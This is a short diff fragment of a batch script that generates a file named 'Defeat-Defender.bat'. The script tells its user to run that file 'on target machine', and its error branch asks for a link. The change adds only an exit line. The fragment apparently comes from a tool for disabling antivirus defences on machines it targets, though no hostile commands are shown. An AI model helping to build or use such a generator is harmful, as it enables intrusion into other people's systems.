@@ -25,7 +25,7 @@ echo. >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo.
 echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
-
+EXIT /B %ERRORLEVEL% 
 :error
 echo.
 echo Please Enter Link And Try Again!!!
